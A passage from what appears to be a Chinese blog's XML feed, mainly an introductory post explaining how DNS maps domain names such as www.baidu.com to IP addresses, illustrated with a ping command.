&lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;十年寒窗无人问，一举成名天下知&lt;br&gt;                            – Cai_Team&lt;/p&gt;
&lt;/blockquote&gt;
      
    
    </summary>
    
      <category term="思科认证" scheme="127.0.0.1/categories/%E6%80%9D%E7%A7%91%E8%AE%A4%E8%AF%81/"/>
    
    
      <category term="OSI七成模型" scheme="127.0.0.1/tags/OSI%E4%B8%83%E6%88%90%E6%A8%A1%E5%9E%8B/"/>
    
      <category term="网络设备" scheme="127.0.0.1/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/"/>
    
  </entry>
  
  <entry>
    <title>计算机是如何访问网站的</title>
    <link href="127.0.0.1/2018/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E5%A6%82%E4%BD%95%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99%E7%9A%84/"/>
    <id>127.0.0.1/2018/05/27/计算机是如何访问网站的/</id>
    <published>2018-05-27T03:50:40.000Z</published>
    <updated>2018-05-27T09:57:02.000Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger"><p>我们都知道，计算机访问网站是通过域名( <a href="http://www.xxx.xxx" target="_blank" rel="noopener">www.xxx.xxx</a> )来访问一个网站的，其实并不是，下面我来讲解一下</p></div><a id="more"></a><h2 id="计算机是如何通过域名来访问一个网站的"><a href="#计算机是如何通过域名来访问一个网站的" class="headerlink" title="计算机是如何通过域名来访问一个网站的"></a>计算机是如何通过域名来访问一个网站的</h2><p><strong>其实在很久以前中，是用 IP 来直接访问网站的，但是因为 IP 的数字过长，又不好记，所以现在都改用 <a href="http://www.xxx.xxx" target="_blank" rel="noopener">www.xxx.xxx</a> 的形式访问网站了，也就是域名，我们先来看看用 IP 来访问百度:</strong></p><p>我们先打开CMD，输入命令<code>ping www.baidu.com</code>:<br><img src="http://static.zybuluo.com/1kbfree/i0ns2hg2h3l5luvqcapyuh8k/image_1cefrtdo91nmdb45n0124019ua9.png" alt="image_1cefrtdo91nmdb45n0124019ua9.png-55.5kB"><br><em>可以看到百度的 IP 地址是<code>183.232.231.172</code>，我们用浏览器访问一下</em></p><p><img src="http://static.zybuluo.com/1kbfree/mxy68596adn0h5ifpo6uvbgk/image_1cefrvdhk1d7u1ecgjdbl47kb0m.png" alt="image_1cefrvdhk1d7u1ecgjdbl47kb0m.png-221.1kB"><br><em>可以看到这2个是一样的，那么下面就来说说原理</em></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="什么是DNS"><a href="#什么是DNS" class="headerlink" title="什么是DNS"></a>什么是DNS</h3><blockquote class="blockquote-center"><p>域名解析服务，简单的说网络的地址是数字组成的，例如百度的服务器地址是<code>183.232.231.172</code>，我们的电脑通过这个地址访问百度，但是这个数字记忆起来相当麻烦，于是就有了<a href="http://www.baidu.com这个更直观的表示方法，DNS就是连接这两者的服务。" target="_blank" rel="noopener">www.baidu.com这个更直观的表示方法，DNS就是连接这两者的服务。</a></p></blockquote><p>也就是说，当我们每次访问<code>www.baidu.com</code>的时候，它就会去找Dns服务器，下面我来做一个对话,也就是DNS域名解析过程：</p><p><em>算了我不说了，直接看图吧~(把这里的<code>www.163.com</code>看成是<code>www.baidu.com</code>，把那个<code>1.1.1.1</code>看成<code>183.232.231.172</code>)</em><br>![image_1cefsiau26771tmn9t911471pnb13.png-571.3kB]<a href="选自CSDN">3</a></p><p>接着可以看这个文章: <a href="https://blog.csdn.net/cloudox_/article/details/69669035" target="_blank" rel="noopener">https://blog.csdn.net/cloudox_/article/details/69669035</a> (我感觉我讲的肯定没他好，我不擅长表达这些概念上的知识，哈哈哈，其实是为了找借口溜~v~)</p><p>也就是说，当我们每次访问<code>www.baidu.com</code>的时候，它就会去找Dns服务器，下面我来做一个对话,也就是DNS域名解析过程：</p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;div class=&quot;note danger&quot;&gt;&lt;p&gt;我们都知道，计算机访问网站是通过域名( &lt;a href=&quot;http://www.xxx.xxx&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.xxx.xxx&lt;/a&gt; )来访问一个网站的，其实并不是，下面我来讲解一下&lt;/p&gt;&lt;/div&gt;
    
    </summary>
    
      <category term="计算机网络" scheme="127.0.0.1/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="计算机网络" scheme="127.0.0.1/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
      <category term="Dns" scheme="127.0.0.1/tags/Dns/"/>
    
      <category term="必修课" scheme="127.0.0.1/tags/%E5%BF%85%E4%BF%AE%E8%AF%BE/"/>
    
  </entry>
  
</feed>
